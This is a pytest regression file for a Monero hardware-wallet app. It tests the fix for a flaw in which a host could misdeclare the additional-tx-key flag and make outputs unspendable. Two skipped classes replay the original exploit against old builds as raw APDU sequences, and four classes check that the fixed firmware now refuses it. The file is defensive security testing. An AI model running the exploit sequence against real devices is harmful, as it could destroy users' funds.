"""
The main tx pubkey must match the address type and the additional-key flag.

For a non-change output INS_GEN_TXOUT_KEYS derives against the per-output
additional secret when both is_subaddress and need_additional_txkeys are set, and
against the tx secret otherwise (src/monero_key.c:1030-1035). The recipient can
only recover the output if the scalar behind a published pubkey is the one that was
used, which fixes the legitimate combinations:

  num_std  num_sub   txkey_pub   need_additional_txkeys
  >=1      0         r*G         false
  0        1         r*Bout      false
  >=1      >=1       r*G         true
  0        >=2       r*G         true

The device used to accept txkey_pub == r*G or == r*Bout for any output without
correlating it to the two flags. A host could therefore declare a subaddress
destination honestly at review while telling the device at derivation time that no
additional key was needed: the recipient then had only the main tx pubkey to scan
with, derived a different one-time key, and the output was unspendable -- a burn,
not a theft. Binding could never have fixed it, because INS_VALIDATE/P1=2 carries
no need_additional_txkeys field at all; the fix correlates the three values at
derivation instead, statelessly.

Classes, in file order:
  TestNeedAdditionalChangesTheOutputKey  skipped: shows the flag changes the
                                         on-chain output key. Its need_additional=0
                                         case is now refused at derivation, so it
                                         only runs with --run-skipped on an old
                                         build.
  TestNeedAdditionalUnboundVuln          skipped: the original exploit.
  TestRejects*                           the four impossible combinations, each
                                         refused 0x6984 at derivation.

The legitimate rows are asserted in test_multi_dest_additional_keys.py, and the
is_subaddress binding in test_vuln_is_subaddress_unbound.py. Each rejection exits
the app, so every TestRejects* class holds exactly one test.

Run: pytest tests/test_vuln_need_additional_unbound.py -v --device flex   (DEBUG=1)
"""

import struct

import pytest

from ragger.backend.interface import BackendInterface
from ragger.error import ExceptionRAPDU
from ragger.navigator import Navigator

from monero_client.monero_types import SigType, Keys, Type, InsType
from monero_client.monero_cmd import MoneroCmd, PROTOCOL_VERSION
from monero_client.monero_crypto_cmd import MoneroCryptoCmd
from monero_client.crypto.hmac import hmac_sha256
from monero_client.utils.tx_prefix import build_tx_prefix_outkeys

# Returned by the main-tx-pubkey check at derivation.
SW_WRONG_DATA = 0x6984
SW_SECURITY_COMMITMENT_CHAIN_CONTROL = 0x6914

ZERO_COMMITMENT = bytes(32)
ATTACKER_PROOF = b"\xad" * 32
FEE = 30660000
AMOUNTS = [907880000, 0]


def _raw_apdu(ins: InsType, p1: int, p2: int, option: int, payload: bytes = b"") -> bytes:
    """Full APDU in the app's framing (option is the first data byte)."""
    return struct.pack("BBBBBB", PROTOCOL_VERSION, ins.value, p1, p2,
                       1 + len(payload), option) + payload


def _output_payload(view: bytes, spend: bytes, ak: bytes, blinded_mask: bytes,
                    blinded_amount: bytes, is_change: bool,
                    is_subaddress: bool) -> bytes:
    """An INS_VALIDATE/P1=2 record. Note what is absent: need_additional_txkeys."""
    return b"".join((
        b"\x01" if is_subaddress else b"\x00",
        b"\x01" if is_change else b"\x00",
        view, spend, ak,
        hmac_sha256(ak, MoneroCryptoCmd.HMAC_KEY, Type.AMOUNT_KEY),
        ZERO_COMMITMENT, blinded_mask, blinded_amount,
    ))


def _gen_txout_keys_raw(backend: BackendInterface, tx_priv_key: bytes,
                        tx_pub_key: bytes, view: bytes, spend: bytes,
                        output_index: int, is_change: bool, is_subaddress: bool,
                        need_additional: bool, additional_sec: bytes):
    """INS_GEN_TXOUT_KEYS with need_additional_txkeys and the additional secret both
    under test control. The client helper always reuses the tx private key there,
    making s == r and both derivation branches identical.

    Returns (amount_key, out_eph_key, additional_pub or None)."""
    def _k(v):
        return v + hmac_sha256(v, MoneroCryptoCmd.HMAC_KEY, Type.SCALAR)

    payload = b"".join((
        struct.pack(">I", 0),                       # tx_version
        _k(tx_priv_key), tx_pub_key, view, spend,
        struct.pack(">I", output_index),
        b"\x01" if is_change else b"\x00",
        b"\x01" if is_subaddress else b"\x00",
        b"\x01" if need_additional else b"\x00",
        _k(additional_sec) if need_additional else bytes(33),
        b"\x00",                                    # use_view_tags
    ))
    data = backend.exchange_raw(
        _raw_apdu(InsType.INS_GEN_TXOUT_KEYS, 0, 0, 0x00, payload)).data
    expected = 128 if need_additional else 96
    assert len(data) == expected, f"expected {expected} bytes, got {len(data)}"
    return data[:32], data[64:96], data[96:128] if need_additional else None


def _open_real_tx(monero: MoneroCmd, state):
    """reset -> REAL -> open_tx, recording the device's own keys as the victim.
    REAL matters: without it tx_sig_mode stays NONE and every REAL-only block --
    the OUTK chain included -- is skipped."""
    monero.reset_and_get_version(monero_client_version=b"0.18")
    view, spend, addr = monero.get_public_keys()
    state["victim"] = Keys(public_view_key=view, public_spend_key=spend,
                           secret_view_key=None, secret_spend_key=None, addr=addr)
    assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL
    tx_pub_key, tx_priv_key, _, _ = monero.open_tx()
    state["R"] = tx_pub_key
    state["tx_pub_key"] = tx_pub_key
    state["tx_priv_key"] = tx_priv_key


def _rBout(monero: MoneroCmd, state) -> bytes:
    """r * Bout, computed on-device -- the host never sees r."""
    key = monero.secret_scalar_mul_key(pub_key=state["victim"].public_spend_key,
                                       _scalar=state["tx_priv_key"])
    assert key != state["R"], "r*Bout must differ from r*G"
    return key


def _expect_rejected(monero: MoneroCmd, backend: BackendInterface, state,
                     is_subaddress: bool, need_additional: bool, txkey_is_R: bool):
    """Derive one non-change output with an impossible combination and require
    0x6984. The check runs before the additional key is generated, so the secret
    passed here is irrelevant."""
    _open_real_tx(monero, state)
    txkey = state["R"] if txkey_is_R else _rBout(monero, state)
    with pytest.raises(ExceptionRAPDU) as exc:
        _gen_txout_keys_raw(
            backend, state["tx_priv_key"], txkey,
            state["victim"].public_view_key, state["victim"].public_spend_key,
            output_index=0, is_change=False, is_subaddress=is_subaddress,
            need_additional=need_additional,
            additional_sec=state["tx_priv_key"])
    assert exc.value.status == SW_WRONG_DATA, (
        f"expected {SW_WRONG_DATA:#06x} for is_subaddress={int(is_subaddress)}, "
        f"need_additional={int(need_additional)}, "
        f"txkey_pub={'r*G' if txkey_is_R else 'r*Bout'}; "
        f"got {exc.value.status:#06x}")


@pytest.mark.skip(reason="Shows need_additional_txkeys changing the output key; its "
                         "need_additional=0 case is now refused at derivation. Use "
                         "--run-skipped on a build without the correlation check.")
@pytest.mark.incremental
class TestNeedAdditionalChangesTheOutputKey:
    """With is_subaddress set, need_additional_txkeys decides which secret the
    derivation uses -- so it decides who can spend the output."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {}

    @staticmethod
    def test_flag_changes_derivation(monero: MoneroCmd, backend: BackendInterface,
                                     state):
        # A throwaway tx, just for a second device-encrypted scalar: the additional
        # secret must differ from r. The spk key is seed-derived and the DEBUG hmac
        # key constant, so enc(r) from one tx is usable in the next.
        _open_real_tx(monero, state)
        other_sec = state["tx_priv_key"]
        monero.close_tx()

        _open_real_tx(monero, state)
        assert other_sec != state["tx_priv_key"], "the two tx secrets must differ"

        derived = {}
        for need_add in (False, True):
            derived[need_add] = _gen_txout_keys_raw(
                backend, state["tx_priv_key"], state["R"],
                state["victim"].public_view_key, state["victim"].public_spend_key,
                output_index=0, is_change=False, is_subaddress=True,
                need_additional=need_add, additional_sec=other_sec)

        assert derived[False][1] != derived[True][1], (
            "need_additional_txkeys did not change the one-time output key")
        assert derived[False][2] is None and derived[True][2] is not None, (
            "only need_additional_txkeys=1 should publish an additional pubkey")

    @staticmethod
    def test_flag_close(monero: MoneroCmd):
        monero.close_tx()


@pytest.mark.skip(reason="The original exploit: a subaddress destination derived "
                         "without an additional key, reviewed honestly. Refused at "
                         "derivation now. Use --run-skipped on an old build.")
@pytest.mark.incremental
class TestNeedAdditionalUnboundVuln:
    """Derived with need_additional_txkeys clear, reviewed entirely honestly, so the
    OUTK chain matched and the transaction finalized. Nothing on the device could
    tell it apart from the need_additional_txkeys=1 flow whose output key differs --
    the field is simply not in the review payload."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {}

    @staticmethod
    def test_gap_setup(monero: MoneroCmd, device, test_name: str, state):
        _open_real_tx(monero, state)
        state["ak"], state["eph"] = [], []
        for index, (is_change, is_sub) in enumerate(((False, True), (True, False))):
            ak, eph, _ = monero.gen_txout_keys(
                _tx_priv_key=state["tx_priv_key"], tx_pub_key=state["R"],
                dst_pub_view_key=state["victim"].public_view_key,
                dst_pub_spend_key=state["victim"].public_spend_key,
                output_index=index, is_change_addr=is_change,
                is_subaddress=is_sub, need_additional_txkeys=False)
            state["ak"].append(ak)
            state["eph"].append(eph)

        prefix = build_tx_prefix_outkeys(vout_keys=state["eph"],
                                         tx_pubkey=state["R"])
        monero.prefix_hash_init(test_name, device, navigator=None, version=0,
                                timelock=0)
        state["prefixh"] = monero.prefix_hash_update(index=1, payload=prefix,
                                                     is_last=True)
        masks = [monero.gen_commitment_mask(ak) for ak in state["ak"]]
        state["blinded_mask"], state["blinded_amount"] = [], []
        for ak, mask, amount in zip(state["ak"], masks, AMOUNTS):
            bm, ba = monero.blind(_ak_amount=ak, mask=mask, amount=amount,
                                  is_short=True)
            state["blinded_mask"].append(bm)
            state["blinded_amount"].append(ba)

    @staticmethod
    def test_gap_honest_review_approved(monero: MoneroCmd,
                                        backend: BackendInterface,
                                        navigator: Navigator, test_name: str,
                                        state):
        """The review is entirely honest, so the victim's subaddress is rendered and
        approved."""
        monero.validate_prehash_init(test_name, backend.device, navigator, 1, 0, FEE)
        for index, (is_change, is_sub) in enumerate(((False, True), (True, False))):
            monero.validate_prehash_update(
                backend, test_name, navigator, index=index + 1, is_short=True,
                is_change_addr=is_change, is_subaddress=is_sub,
                dst_pub_view_key=state["victim"].public_view_key,
                dst_pub_spend_key=state["victim"].public_spend_key,
                _ak_amount=state["ak"][index], commitment=ZERO_COMMITMENT,
                blinded_amount=state["blinded_amount"][index],
                blinded_mask=state["blinded_mask"][index],
                is_last=index == 1, swipe_count=3)

    @staticmethod
    def test_gap_finalize_succeeds(backend: BackendInterface, state):
        data = backend.exchange_raw(_raw_apdu(
            InsType.INS_VALIDATE, 3, 1, 0x00,
            state["prefixh"] + ATTACKER_PROOF)).data
        assert len(data) == 32

    @staticmethod
    def test_gap_close(monero: MoneroCmd):
        monero.close_tx()


class TestRejectsSubaddressWithoutAdditionalKeyOnMainKey:
    """The attack: a subaddress destination with no additional key must carry
    r*Bout, so r*G cannot be accepted."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {}

    @staticmethod
    def test_reject_sub_no_add_rG(monero: MoneroCmd, backend: BackendInterface,
                                  state):
        _expect_rejected(monero, backend, state, is_subaddress=True,
                         need_additional=False, txkey_is_R=True)


class TestRejectsStandardWithSubaddressKey:
    """A standard destination derives from r*G, so r*Bout cannot be accepted."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {}

    @staticmethod
    def test_reject_std_no_add_rBout(monero: MoneroCmd, backend: BackendInterface,
                                     state):
        _expect_rejected(monero, backend, state, is_subaddress=False,
                         need_additional=False, txkey_is_R=False)


class TestRejectsStandardWithAdditionalKeyAndSubaddressKey:
    """Same for a standard destination in a transaction that does use additional
    keys."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {}

    @staticmethod
    def test_reject_std_add_rBout(monero: MoneroCmd, backend: BackendInterface,
                                  state):
        _expect_rejected(monero, backend, state, is_subaddress=False,
                         need_additional=True, txkey_is_R=False)


class TestRejectsSubaddressWithAdditionalKeyAndSubaddressKey:
    """A subaddress destination that has its own additional key takes the main key
    from r*G, so r*Bout cannot be accepted there either."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {}

    @staticmethod
    def test_reject_sub_add_rBout(monero: MoneroCmd, backend: BackendInterface,
                                  state):
        _expect_rejected(monero, backend, state, is_subaddress=True,
                         need_additional=True, txkey_is_R=False)
